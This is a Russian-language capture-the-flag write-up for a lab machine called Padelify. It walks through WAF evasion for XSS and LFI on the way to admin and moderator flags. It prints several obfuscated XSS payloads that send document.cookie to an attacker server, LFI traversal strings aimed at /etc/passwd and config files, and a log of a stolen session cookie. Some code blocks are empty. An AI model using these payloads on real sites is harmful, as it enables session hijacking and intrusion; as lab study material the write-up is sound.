# Отчет по прохождению машины Padelify

## 1. Разведка (Reconnaissance)

Первым этапом было проведено сканирование портов целевой системы с помощью Nmap. Результаты показали открытые порты 22/tcp (SSH) и 80/tcp (Apache). На порту 80 обнаружен веб-сайт, требующий дальнейшего анализа.

## 2. Анализ веб-приложения

В ходе фаззинга директорий и файлов были обнаружены следующие страницы и пути:

- login.php, register.php, index.php, header.php, footer.php, css, js, javascript, logout.php, config, 403.html, logs, dashboard.php, live.php, status.php.

Особый интерес вызвали страницы live.php (возможный LFI) и config (содержащий app.conf, который возвращал 403). В каталоге logs был найден файл error.log.

## 3. Тестирование на уязвимости

### 3.1. SQL-инъекция

Проверка SQL-инъекции в форме логина не дала результатов.

### 3.2. Обход регистрации и WAF

При регистрации аккаунта модератор подтверждает каждый новый аккаунт. Попытка зарегистрироваться с XSS-пейлоадом:

```html
<script>fetch("http://192.168.187.139:8888/?c="+document.cookie)</script>
```

привела к кастомной странице 403. Firewall активен.

## 4. Обход WAF для XSS

### 4.1. Base64 обфускация

Был подготовлен закодированный в base64 fetch-запрос:

```
ZmV0Y2goImh0dHA6Ly8xOTIuMTY4LjE4Ny4xMzk6ODg4OC8/Yz0iK2RvY3VtZW50LmNvb2tpZSk=
```

Пейлоад был вставлен в ссылку с использованием HTML-кодировки и юникод-экранирования:

```html
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("base64"))>test</a>
```

При клике на ссылку на запущенный сервер прилетали куки.

### 4.2. Обфускация через числовые HTML-сущности

Был использован тег img с обфусцированным onerror:

```html

```

### 4.3. Обфускация через юникод

```html
<svg onl&#x0D;oad='\x66\x65\x74\x63\x68("http://192.168.187.139:8888?c="+\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65)'>
```

```html

```

WAF был обойден, но куки не были получены. Вероятно, требовалось взаимодействие модератора.

## 5. Исследование LFI в live.php

Параметр page в live.php показал потенциальную уязвимость к LFI:

```
/live.php?page=/../../../../../../../../../../../etc/passwd
```

Запрос возвращал 403 ошибку (WAF). При попытке обхода фильтра удалось избежать 403, но ответ содержал сообщение о том, что файл не найден или заблокирован WAF.

## 6. Обход WAF для LFI

В ходе перебора было замечено, что любое слово, содержащее "app", вызывало 403. Например:

- _app.conf
- app.conf
- crapp.conf
- diagwebapp.conf
- facebookapp.conf
- gpapp.conf
- loanapp.conf
- nasapp.conf
- openapp.conf
- onlineapp.conf
- securesimpleapp.conf
- singleapp.conf

При переводе в HEX-кодировку 403 не падал, но содержимого не было:

```
?page=\x61\x70\x70\x2e\x63\x6f\x6e\x66
```

Использование HTML-сущностей позволило избежать ошибки:

```
?page=&#97;pp.conf
```

Однако содержимого всё равно не было.

## 7. Успешное чтение app.conf

После экспериментов с php://filter и дополнительной обфускацией был найден рабочий пейлоад:

```
?page=%2fconfig%2fapp%2Econf
```

В ответе было получено содержимое файла app.conf:

```
version = "1.4.2"
enable_live_feed = true
enable_signup = true
env = "staging"
site_name = "Padelify Tournament Portal"
max_players_per_team = 4
maintenance_mode = false

```

## 8. Получение флага администратора

Используя admin_info = "bL}8,S9W1o44", выполнена авторизация под пользователем admin. Получен флаг администратора.

## 9. Получение флага модератора

После входа в админ-панель появилось понимание интерфейса, процесса подтверждения аккаунтов и отображения введённых данных.

Был создан скрипт get_mod_name.html для извлечения username модератора. Также был создан скрипт для чтения cookie и добавления их в GET-параметр запроса к серверу атакующего.

В результате на сервер атакующего пришёл запрос:

```
10.49.143.173 - - [29/Apr/2026 08:58:38] "GET /?c=PHPSESSID%3Dds2dog1os6ge064giubffisvd3 HTTP/1.1" 200 -
```

Полученная сессия была использована для авторизации под модератором. Флаг модератора успешно получен.

## 10. Достижения и выводы

В ходе прохождения машины были успешно применены следующие техники:

- Обход WAF с использованием HTML-сущностей, HEX-кодирования, юникод-экранирования и base64.
- Эксплуатация LFI через обфусцированные пути и php://filter.
- Чтение конфигурационных файлов через LFI.
- Кража сессии модератора через XSS с обходом WAF.
